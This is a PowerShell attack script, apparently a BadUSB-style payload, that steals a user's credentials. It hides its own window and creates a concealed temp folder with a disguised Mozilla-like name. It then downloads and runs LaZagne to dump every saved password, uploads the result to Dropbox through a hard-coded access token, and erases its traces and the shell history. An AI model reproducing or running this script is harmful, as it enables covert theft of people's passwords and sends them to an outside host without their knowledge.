function Set-WindowState {
    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [Object[]] $InputObject,

        [Parameter(Position = 1)]
        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
        [string] $State = 'SHOW',
        [switch] $SuppressErrors = $false,
        [switch] $SetForegroundWindow = $false
    )

    Begin {
        $WindowStates = @{
        'FORCEMINIMIZE'         = 11
            'HIDE'              = 0
            'MAXIMIZE'          = 3
            'MINIMIZE'          = 6
            'RESTORE'           = 9
            'SHOW'              = 5
            'SHOWDEFAULT'       = 10
            'SHOWMAXIMIZED'     = 3
            'SHOWMINIMIZED'     = 2
            'SHOWMINNOACTIVE'   = 7
            'SHOWNA'            = 8
            'SHOWNOACTIVATE'    = 4
            'SHOWNORMAL'        = 1
        }

        $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

        if (!$global:MainWindowHandles) {
            $global:MainWindowHandles = @{ }
        }
    }

    Process {
        foreach ($process in $InputObject) {
            $handle = $process.MainWindowHandle

            if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                $handle = $global:MainWindowHandles[$process.Id]
            }

            if ($handle -eq 0) {
                if (-not $SuppressErrors) {
                    Write-Error "Main Window handle is '0'"
                }
                continue
            }

            $global:MainWindowHandles[$process.Id] = $handle

            $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
            if ($SetForegroundWindow) {
                $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
            }

            Write-Verbose ("Set Window State '{1} on '{0}'" -f $MainWindowHandle, $State)
        }
    }
}
Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
Get-Process -ID $PID | Set-WindowState -State HIDE

#TEMP location
$dir = "C:\Users\$env:UserName\AppData\Local\Temp\mozilla-temp-fiIes"
New-Item -ItemType Directory -Path $dir
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'

#lazagne
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all > "$dir\output.txt"

#Exfil
#Token
$dropboxAccessToken = "sl.B8KhQSNeWnyCzotjrNQJXFJN00APJyRDbGoCb3ogxDMHgpNJy6hVd4AImSiVDtugFJpQ2y46_5ojvmIdHqRiw_VYdH4_ZR0ZTWJUv2fEePSLK6MS29sYWaglJo1TgEFz-wcgPxY64Q8-"
$filePath = "$dir\output.txt"
$fileContent = Get-Content -Path $filePath -Raw
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
$headers = @{
    "Authorization" = "Bearer $dropboxAccessToken"
    "Content-Type" = "application/octet-stream"
    "Dropbox-API-Arg" = '{"path":"/' + $fileName + '","mode":"overwrite","autorename":true,"mute":false}'
}
Invoke-RestMethod -Uri $dropboxUploadUrl -Method POST -Headers $headers -Body $fileContent

# Clean up
Remove-Item -Path $dir -Recurse -Force
Clear-History
Set-MpPreference -DisableRealtimeMonitoring $false

# Reboot the system
#Restart-Computer -Force
